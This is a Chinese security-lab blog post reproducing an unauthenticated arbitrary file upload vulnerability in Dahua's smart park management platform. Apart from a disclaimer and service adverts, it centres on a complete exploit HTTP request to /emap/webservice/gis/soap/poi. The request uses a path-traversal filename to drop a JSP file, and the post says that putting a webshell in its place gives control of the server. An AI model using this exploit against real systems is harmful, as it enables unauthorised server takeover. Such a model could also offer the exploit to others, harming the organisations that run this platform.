<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yJfjckA_XXcvfa92_Oef1w)

**0x01 阅读须知**

**凯撒安全实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

**0x02 漏洞原理**

大华智慧园区综合管理平台是由大华技术股份有限公司（Dahua Technology）开发的一款综合管理解决方案。该平台旨在帮助园区管理者提高管理效率、提升安全水平、优化资源利用，并实现智能化的园区运营。大华智慧园区综合管理平台采用模块化设计和开放式架构，可根据不同园区的需求进行定制和扩展。同时，它还支持云端部署和移动端访问，方便管理者随时随地监控园区运营情况。大华智慧园区综合管理平台存在前台任意文件上传漏洞。**本文将复现该漏洞的利用方法。**

**![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzunul6ZUoiaGFs5b5SyVe1A4iaqhg7WxWeJkGKeoOMwVa6UAVC5hpeckXQ/640?wx_fmt=png)**

**0x03 漏洞利用**

影响版本：

大华智慧园区综合管理平台

**poc:**

**漏洞利用点为：**

**/emap/webservice/gis/soap/poi 接口，当访问接口时出现如下响应体时，基本可认定该漏洞存在。**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzulLcHGs3sevxjcKLm4Vnhg43qsfD32kE5JZKmj3JvDGKfDZ0po2TfVw/640?wx_fmt=png)

**exp：**

```
POST /emap/webservice/gis/soap/poi HTTP/1.1
Cookie: JSESSIONID=5C1C93DE5EC7F18FBD493CEFB322B71E; JSESSIONID=423EE6DD6937C1E0568CEF2FAB6E9B01
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: xxxxx:xxxx
Content-Length: 3117
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <res:uploadPicFile>
         <arg0>/../../kaisec.jsp</arg0>
         <arg1>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx(webshell)</arg1>
      </res:uploadPicFile>
   </soapenv:Body>
</soapenv:Envelope>

```

**打入 exp** 

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzu5Zc09BNjesQvicuVF7EicLqFwS5WaOia6bXD8C8fiar9Qzwib0xKgXv0EVQ/640?wx_fmt=png)

**访问 / url/kaisa.jsp：**

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzuFaYSbrHypdFDUGEspEVvIBUM49huwoxPjXtzYccibO5pvuLDBW7P9iaQ/640?wx_fmt=png)

  同理 将 poyload 换成 webshell 马 可获取服务器权限：

![](https://mmbiz.qpic.cn/mmbiz_png/fRWdakrtBssucs5ZCVvvlAVSoaahFfzum6HZG0ePh5tXGETuIO6uroqibMPVg1ECnbHxOJ6otdibh2j2MdXIbU7g/640?wx_fmt=png)

关注公众号带你了解更多 0/1day 漏洞

零日 / 一日 漏洞探讨加 Seven_-0928   

本实验室接受正规站点的授权渗透测试服务。如你的公司业务有 Web 渗透测试，高级渗透测试，红蓝对抗，黑客溯源，Java 代码审计等需求可联系以下微信进行商务洽谈：Xud330327

同时欢迎各位师傅加入 HW 闲聊吹水群（2000 人群）

**![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBst6p4gicEgvWYhUG15ibU3fHibbalVucuLZ76mxOCrOhTyhSu8Sru0DlwBYruQhnkIG8ia4shVDPd4VBg/640?wx_fmt=jpeg)**

![](https://mmbiz.qpic.cn/mmbiz_jpg/fRWdakrtBssPEvyWSBIpUFH4FYbmxzwydudRibUP8icaLbZJQ5WmBNtmFzWU8x8avVw34FqSicxFsaQCSfveDUXibg/640?wx_fmt=jpegwxfrom=5wx_lazy=1wx_co=1)